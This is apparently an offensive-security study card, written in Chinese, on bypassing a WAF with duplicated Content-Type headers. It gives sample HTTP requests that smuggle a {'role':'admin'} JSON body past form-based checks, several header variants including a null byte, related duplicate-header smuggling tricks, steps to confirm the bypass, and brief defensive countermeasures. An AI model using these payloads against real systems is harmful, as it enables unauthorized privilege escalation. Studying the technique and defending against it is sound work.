---
title: "双 Content-Type 解析分歧（Parser Disparity）"
type: case-lesson
tags: [api-security, waf-bypass, parser, content-type, smuggling, zerodaylab]
date_created: 2026-10-02
sources: ["x.com/Zerodaylabowner 2026-09"]
---

# 双 Content-Type 解析分歧

> 来源：@Zerodaylabowner「Bypass by Doubling」系列 · 吸收评级 ★★★★
> 本质：利用反代/WAF 与后端应用对**同名头出现两次**的解析策略差异

## 手法

```http
POST /api/update HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Type: application/json

{"role":"admin"}
```

**分歧点**：

| 组件 | 常见行为 | 结果 |
|---|---|---|
| Nginx/CF/AWS WAF | 取**第一个** Content-Type | 按 form 规则校验 → JSON body 不含 form 特征 → 放行 |
| Spring/Express/Flask | 取**最后一个**（或合并） | 按 JSON 解析 → `{"role":"admin"}` 正常进业务 |

→ WAF 看到的是"无害 form 提交"，后端收到的是"提权 JSON"。

## 变体

```http
# 1. 大小写混淆（某些网关规范化、后端不规范化）
content-type: application/x-www-form-urlencoded
Content-Type: application/json

# 2. 参数污染型（分号后塞参数让 WAF 误判）
Content-Type: application/json; charset=utf-8; boundary=x
Content-Type: application/x-www-form-urlencoded

# 3. 空值头折叠（HTTP/2 伪头场景）
content-type:\x00application/json
```

## 同族思路（Bypass by Doubling 系列）

- **双 `Content-Length`**：CL-CL / CL-TE smuggling 的前置探测
- **双参数名**：`role=user&role=admin`，后端取值策略不一致（first/last/append）
- **双 Cookie 头**：部分中间件只 parse 第一个 Cookie，其余透传后端

## 实测判据

```
1. 直接发 {"role":"admin"} → 403/blocked     = WAF 在按 JSON 规则拦
2. 双 CT 复发 → 200/业务成功                  = parser disparity confirmed
3. 单 CT: application/x-www-form-urlencoded + JSON body → 大概率 400
   （说明后端真的认最后一个 CT，而不是瞎解析）
```

## 关联

- `api-security/api-bypass/` 的签名绕过卡（方法+路径层）
- `api-security/case-lessons/` 的 smuggling 实例（TCP 层分歧）
- 本卡是 **header 语义层**分歧，与上面两层互补：同一条链上「路径→头→体」三段各自可分歧

## 反制（蓝队视角）

WAF 层强制单值化 Content-Type（出现 2 次即 400）；网关与应用统一用同一解析库；对 `application/json` 强制 body 校验无论 CT 声明为何。
